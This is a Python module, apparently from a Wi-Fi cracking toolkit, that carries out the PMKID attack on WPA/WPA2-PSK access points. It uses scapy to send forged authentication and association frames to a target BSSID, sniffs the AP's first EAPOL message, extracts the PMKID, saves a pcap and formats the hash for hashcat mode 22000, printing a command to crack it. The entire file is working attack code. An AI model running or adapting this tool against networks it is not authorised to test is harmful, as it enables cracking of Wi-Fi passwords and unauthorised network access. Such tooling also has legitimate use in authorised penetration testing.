"""PMKID attack module - captures PMKID from AP without requiring a client.

The PMKID attack (discovered 2018) allows capturing a crackable hash
from the AP's first EAPOL message (Message 1) without needing a full
4-way handshake or a connected client. This works by:

1. Sending an association request to the AP
2. The AP responds with EAPOL Message 1 containing PMKID in the RSN IE
3. The PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA)
4. This hash can be cracked offline with hashcat mode 22000

Advantages over traditional handshake capture:
- No client needs to be connected to the AP
- No deauthentication needed
- Faster (single frame capture)

Limitations:
- Not all APs include PMKID in their response
- Only works with WPA/WPA2-PSK (not Enterprise)
- Requires hashcat for cracking (aircrack-ng supports it in newer versions)
"""

import os
import time
import struct
import hashlib
import hmac
import threading
from datetime import datetime

from scapy.all import (
    Dot11, Dot11Auth, Dot11AssoReq, Dot11Elt, Dot11Beacon,
    EAPOL, RadioTap, sniff, sendp, wrpcap
)

from config import CAPTURES_DIR, PMKID_TIMEOUT
from utils import print_status, print_success, print_error, print_warning, print_info, Colors


class PMKIDAttack:
    """Captures PMKID from an AP's first EAPOL message.

    This attack works without any connected clients. It triggers
    the AP to send EAPOL Message 1 which may contain a PMKID
    value that can be cracked offline.
    """

    def __init__(self, interface, bssid, client_mac=None, ssid="unknown"):
        """
        Args:
            interface: Monitor mode interface.
            bssid: Target AP BSSID.
            client_mac: Our MAC address (auto-detected if None).
            ssid: Target SSID (for filename).
        """
        self.interface = interface
        self.bssid = bssid.lower()
        self.client_mac = (client_mac or self._get_mac()).lower()
        self.ssid = ssid
        self.pmkid = None
        self.pmkid_packet = None
        self.all_packets = []
        self._stop_event = threading.Event()

    def _get_mac(self):
        """Get the MAC address of our interface."""
        try:
            import fcntl
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            info = fcntl.ioctl(
                s.fileno(), 0x8927,
                struct.pack('256s', self.interface[:15].encode())
            )
            return ':'.join('%02x' % b for b in info[18:24])
        except Exception:
            # Fallback: generate a random-ish MAC
            import random
            mac = [0x00, 0x11, 0x22,
                   random.randint(0x00, 0xff),
                   random.randint(0x00, 0xff),
                   random.randint(0x00, 0xff)]
            return ':'.join('%02x' % b for b in mac)

    def _build_auth_request(self):
        """Build an authentication request frame."""
        return (
            RadioTap() /
            Dot11(
                type=0, subtype=11,  # Authentication
                addr1=self.bssid,    # Destination (AP)
                addr2=self.client_mac,  # Source (us)
                addr3=self.bssid     # BSSID
            ) /
            Dot11Auth(algo=0, seqnum=1, status=0)  # Open System auth
        )

    def _build_assoc_request(self):
        """Build an association request frame."""
        ssid_elt = Dot11Elt(ID=0, info=self.ssid.encode())
        rates_elt = Dot11Elt(ID=1, info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')

        # RSN IE (WPA2 capabilities)
        rsn_data = (
            b'\x01\x00'              # Version
            b'\x00\x0f\xac\x04'      # Group cipher: CCMP
            b'\x01\x00'              # Pairwise cipher count
            b'\x00\x0f\xac\x04'      # Pairwise cipher: CCMP
            b'\x01\x00'              # AKM count
            b'\x00\x0f\xac\x02'      # AKM: PSK
            b'\x00\x00'              # RSN capabilities
        )
        rsn_elt = Dot11Elt(ID=48, info=rsn_data)

        return (
            RadioTap() /
            Dot11(
                type=0, subtype=0,   # Association Request
                addr1=self.bssid,
                addr2=self.client_mac,
                addr3=self.bssid
            ) /
            Dot11AssoReq(cap=0x1104, listen_interval=3) /
            ssid_elt / rates_elt / rsn_elt
        )

    def _extract_pmkid(self, packet):
        """Extract PMKID from an EAPOL Message 1 packet.

        The PMKID is in the RSN PMKID-List field of the Key Data
        in EAPOL Message 1. It's a 16-byte value found in a specific
        tag (Tag Number = 4, OUI = 00-0f-ac, Type = 04).

        Returns:
            bytes: 16-byte PMKID or None.
        """
        if not packet.haslayer(EAPOL):
            return None

        raw = bytes(packet[EAPOL])

        # EAPOL-Key frame:
        # Type(1) + KeyInfo(2) + KeyLen(2) + ReplayCounter(8) +
        # Nonce(32) + IV(16) + RSC(8) + Reserved(8) + MIC(16) + KeyDataLen(2)
        # = offset 97 for key data start (from EAPOL layer start)
        # But EAPOL header is 4 bytes, so Key descriptor starts at offset 4

        if len(raw) < 101:
            return None

        # Key data length is at offset 97-98 (from EAPOL body start)
        try:
            key_data_len = (raw[97] << 8) | raw[98]
            key_data = raw[99:99 + key_data_len]
        except IndexError:
            return None

        if len(key_data) < 20:
            return None

        # Search for PMKID in the key data
        # RSN PMKID tag: dd <len> 00-0f-ac 04 <pmkid(16)>
        # Or the KDE format: type=4 in RSN KDE
        idx = 0
        while idx < len(key_data) - 2:
            tag_type = key_data[idx]
            tag_len = key_data[idx + 1]

            if idx + 2 + tag_len > len(key_data):
                break

            tag_data = key_data[idx + 2:idx + 2 + tag_len]

            # Vendor specific (0xdd) with OUI 00-0f-ac type 04 = PMKID
            if tag_type == 0xdd and tag_len >= 20:
                if tag_data[:4] == b'\x00\x0f\xac\x04':
                    pmkid = tag_data[4:20]
                    # Check it's not all zeros
                    if pmkid != b'\x00' * 16:
                        return pmkid

            idx += 2 + tag_len

        return None

    def _packet_handler(self, packet):
        """Process captured packets looking for PMKID."""
        self.all_packets.append(packet)

        if not packet.haslayer(EAPOL):
            return

        # Check if from our target AP
        if packet.haslayer(Dot11):
            addr2 = (packet[Dot11].addr2 or "").lower()
            if addr2 != self.bssid:
                return

        pmkid = self._extract_pmkid(packet)
        if pmkid:
            self.pmkid = pmkid
            self.pmkid_packet = packet
            hex_str = pmkid.hex()
            print_success(f"PMKID captured: {hex_str}")
            self._stop_event.set()
        else:
            print_info("Received EAPOL from AP (no PMKID in this frame)")

    def capture(self, timeout=None):
        """Execute the PMKID attack.

        Sends authentication/association requests to the AP and
        listens for EAPOL Message 1 containing PMKID.

        Args:
            timeout: Max seconds to wait (default: PMKID_TIMEOUT).

        Returns:
            str: Path to saved pcap file, or None if PMKID not captured.
        """
        timeout = timeout or PMKID_TIMEOUT
        self._stop_event.clear()
        self.pmkid = None
        self.all_packets.clear()

        print_status(f"Starting PMKID attack on {self.bssid}")
        print_info(f"  Our MAC: {self.client_mac}")
        print_info(f"  Target: {self.ssid} ({self.bssid})")
        print_info(f"  Timeout: {timeout}s")
        print()
        print_info("Sending authentication/association requests...")

        # Start sniffing in background
        sniff_thread = threading.Thread(
            target=lambda: sniff(
                iface=self.interface,
                prn=self._packet_handler,
                timeout=timeout,
                store=False,
                stop_filter=lambda _: self._stop_event.is_set()
            ),
            daemon=True
        )
        sniff_thread.start()

        # Give sniffer time to start
        time.sleep(0.5)

        # Send auth + assoc requests in bursts
        auth_pkt = self._build_auth_request()
        assoc_pkt = self._build_assoc_request()

        attempts = 0
        while not self._stop_event.is_set() and attempts < (timeout // 2):
            try:
                # Send authentication request
                sendp(auth_pkt, iface=self.interface, verbose=False)
                time.sleep(0.1)

                # Send association request
                sendp(assoc_pkt, iface=self.interface, verbose=False)
                attempts += 1

                if attempts % 5 == 0:
                    print(f"  Attempts: {attempts}", end="\r")

            except OSError as e:
                print_error(f"Send error: {e}")
                break

            self._stop_event.wait(2)

        sniff_thread.join(timeout=5)
        print()

        if self.pmkid:
            return self._save_capture()
        else:
            print_warning("PMKID not captured. The AP may not support PMKID.")
            print_info("Not all access points include PMKID in their responses.")
            print_info("Try the traditional deauth + handshake capture instead.")
            return None

    def _save_capture(self):
        """Save the captured packets to a pcap file."""
        safe_ssid = "".join(c if c.isalnum() or c in "-_" else "_" for c in self.ssid)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        pcap_path = os.path.join(CAPTURES_DIR, f"pmkid_{safe_ssid}_{timestamp}.pcap")

        wrpcap(pcap_path, self.all_packets)
        print_success(f"Capture saved: {pcap_path}")
        print_info(f"  PMKID: {self.pmkid.hex()}")
        print_info(f"  Crack with: python main.py crack --pcap {pcap_path} --engine hashcat -w <wordlist>")

        return pcap_path

    def format_for_hashcat(self):
        """Format the captured PMKID for direct hashcat input.

        Returns:
            str: Hash string in hc22000 format, or None.
        """
        if not self.pmkid:
            return None

        # hc22000 format for PMKID:
        # WPA*01*pmkid*mac_ap*mac_sta*essid_hex
        pmkid_hex = self.pmkid.hex()
        ap_mac = self.bssid.replace(":", "")
        sta_mac = self.client_mac.replace(":", "")
        essid_hex = self.ssid.encode().hex()

        return f"WPA*01*{pmkid_hex}*{ap_mac}*{sta_mac}*{essid_hex}***"
